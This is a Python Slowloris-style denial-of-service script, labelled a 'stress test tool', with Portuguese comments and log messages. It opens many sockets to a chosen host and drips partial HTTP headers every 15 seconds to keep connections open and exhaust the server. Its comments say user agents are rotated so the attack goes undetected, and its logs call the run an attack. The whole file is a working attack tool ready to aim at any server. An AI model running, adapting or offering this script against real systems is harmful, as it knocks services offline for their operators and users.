import argparse
import logging
import random
import socket
import ssl
import sys
import time

parser = argparse.ArgumentParser(description="IS Stresser - simple stress test tool.", add_help=False)
parser.add_argument('host', nargs="?", help="Target of test.")
parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Show these instructions.')
parser.add_argument('-p', '--port', default=80, help="Target port (default 80).", type=int)
parser.add_argument('-s', '--sockets', default=100, help="Number of sockets to use (default 100).", type=int)
parser.add_argument('-d', '--detaje', dest="verbose", action="store_true", help="Verbose logging.")
parser.add_argument('-r', '--random-ua', dest="randuseragent", action="store_true", help="Use random user-agents.")
parser.add_argument('-q', '--qete', dest="quiet", action="store_true", help="Don't show anything.")
parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS.")

parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(https=False)
parser.set_defaults(quiet=False)

args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit()

if args.verbose and args.quiet:
    print("Use either -d or -q!")
    sys.exit()
else:
    if args.verbose:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
    elif args.quiet:
        logging.basicConfig(level=logging.CRITICAL)
    else:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

list_of_sockets = []

# Usamos diferentes agentes para a tentativa de ataque não ser detectada
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
]

def inicia_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)
    
    s.connect((ip, args.port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Atacando IP %s com %s sockets.", ip, socket_count)
    logging.info("Criando sockets.")
    for _ in range(socket_count):
        try:
            logging.debug("Criando socket %s", _)
            s = inicia_socket(ip)
        except socket.error:
            logging.info("Falha na criação do socket.")
            break
        list_of_sockets.append(s)
    while True:
        try:
            logging.info("Enviando requisições keep-alive usando %s sockets.", len(list_of_sockets))
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s) 
                    
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating sockets.")
                try:
                    s = inicia_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    logging.info("Falha na criação do socket.")
                    break
            time.sleep(15)
        
        except (KeyboardInterrupt, SystemExit):
            logging.info("Ataque finalizado!")
            break

if __name__ == "__main__":
    main()
